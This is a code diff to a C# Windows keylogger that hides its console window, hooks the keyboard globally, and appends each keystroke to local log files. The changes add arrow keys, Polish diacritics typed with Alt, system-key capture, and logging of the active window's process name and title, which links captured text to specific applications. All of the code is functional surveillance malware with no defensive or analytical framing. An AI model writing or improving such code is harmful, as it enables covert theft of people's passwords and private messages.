@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.IO;
 using System.Threading.Tasks;
 using System.Reflection.Emit;
+using System.Threading;
 
 class InterceptKeys
 {
@@ -14,13 +15,15 @@ class InterceptKeys
     private static IntPtr _hookID = IntPtr.Zero;
     private static Stopwatch stopwatch = new Stopwatch();
     private const int IdleThreshold = 2000; // 2 sekundy
+    private static IntPtr previousForegroundWindowHandle;
 
     public static void Main()
     {
         var handle = GetConsoleWindow();
 
-        // Hide
         ShowWindow(handle, SW_HIDE);
+
+        previousForegroundWindowHandle = IntPtr.Zero;
 
         _hookID = SetHook(_proc);
         stopwatch.Start();
@@ -50,6 +53,10 @@ class InterceptKeys
         {
             switch (key)
             {
+                case Keys.Left: return "|LEFT|";
+                case Keys.Up: return "|UP|";
+                case Keys.Right: return "|RIGHT|";
+                case Keys.Down: return "|DOWN|";
                 case Keys.D1: return "!";
                 case Keys.D2: return "@";
                 case Keys.D3: return "#";
@@ -79,6 +86,10 @@ class InterceptKeys
         {
             switch (key)
             {
+                case Keys.Left: return "|LEFT|";
+                case Keys.Up: return "|UP|";
+                case Keys.Right: return "|RIGHT|";
+                case Keys.Down: return "|DOWN|";
                 case Keys.D1: return "1";
                 case Keys.D2: return "2";
                 case Keys.D3: return "3";
@@ -108,7 +119,7 @@ class InterceptKeys
         return "";
     }
 
-    private static string Parse(int key)
+    private static string Parse(int key, bool alt)
     {
         bool shiftKey = (Control.ModifierKeys & Keys.Shift) != 0;
 
@@ -122,6 +133,23 @@ class InterceptKeys
         // litery
         if (char.IsLetter(keyChar))
         {
+            // polska gurom
+            if (alt)
+            {
+                switch (key)
+                {
+                    case (int)Keys.E: return shiftKey ? "Ę" : "ę";
+                    case (int)Keys.L: return shiftKey ? "Ł" : "ł";
+                    case (int)Keys.O: return shiftKey ? "Ó" : "ó";
+                    case (int)Keys.A: return shiftKey ? "Ą" : "ą";
+                    case (int)Keys.S: return shiftKey ? "Ś" : "ś";
+                    case (int)Keys.Z: return shiftKey ? "Ż" : "ż";
+                    case (int)Keys.X: return shiftKey ? "Ź" : "ź";
+                    case (int)Keys.C: return shiftKey ? "Ć" : "ć";
+                    case (int)Keys.N: return shiftKey ? "Ń" : "ń";
+                }
+            }
+
             char caseSensitiveChar = shiftKey ? char.ToUpper(keyChar) : char.ToLower(keyChar);
 
             finalResult = caseSensitiveChar.ToString();
@@ -134,25 +162,85 @@ class InterceptKeys
     private static IntPtr HookCallback(
         int nCode, IntPtr wParam, IntPtr lParam)
     {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)0x0104))
         {
-            int vkCode = Marshal.ReadInt32(lParam);
+            bool alt = false;
+            if (wParam == (IntPtr)0x0104)
+            {
+                alt = true;
+            }
+            LogActiveWindowInfo();
 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
             StreamWriter rawSw = new StreamWriter(Application.StartupPath + @"\raw.txt", true);
+            int vkCode = Marshal.ReadInt32(lParam);
             if (stopwatch.ElapsedMilliseconds >= IdleThreshold)
             {
                 sw.WriteLine();
                 rawSw.WriteLine();
             }
-            sw.Write(Parse(vkCode));
+            sw.Write(Parse(vkCode, alt));
             rawSw.Write((Keys)vkCode);
+            stopwatch.Restart();
+
             sw.Close();
             rawSw.Close();
-            stopwatch.Restart();
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
+
+    private static void LogActiveWindowInfo()
+    {
+        IntPtr currentForegroundWindowHandle = GetForegroundWindow();
+
+        if (currentForegroundWindowHandle != previousForegroundWindowHandle)
+        {
+            StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+            StreamWriter rawSw = new StreamWriter(Application.StartupPath + @"\raw.txt", true);
+
+            Process currentProcess = GetProcessFromWindowHandle(currentForegroundWindowHandle);
+
+            const int nChars = 256;
+            string windowTitle = new string(' ', nChars);
+            GetWindowText(currentForegroundWindowHandle, windowTitle, nChars);
+
+            sw.WriteLine();
+            sw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
+            rawSw.WriteLine();
+            rawSw.WriteLine($"[Process Name: {currentProcess?.ProcessName}, Window Title: {windowTitle.Trim()}]");
+
+            sw.Close();
+            rawSw.Close();
+
+            previousForegroundWindowHandle = currentForegroundWindowHandle;
+        }
+    }
+
+    private static Process GetProcessFromWindowHandle(IntPtr windowHandle)
+    {
+        int processId;
+        GetWindowThreadProcessId(windowHandle, out processId);
+
+        try
+        {
+            return Process.GetProcessById(processId);
+        }
+        catch (ArgumentException)
+        {
+            // guwno?
+            return null;
+        }
+    }
+
+    [DllImport("user32.dll")]
+    private static extern int GetWindowThreadProcessId(IntPtr hWnd, out int lpdwProcessId);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int GetWindowText(IntPtr hWnd, string lpString, int nMaxCount);
+
 
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook,
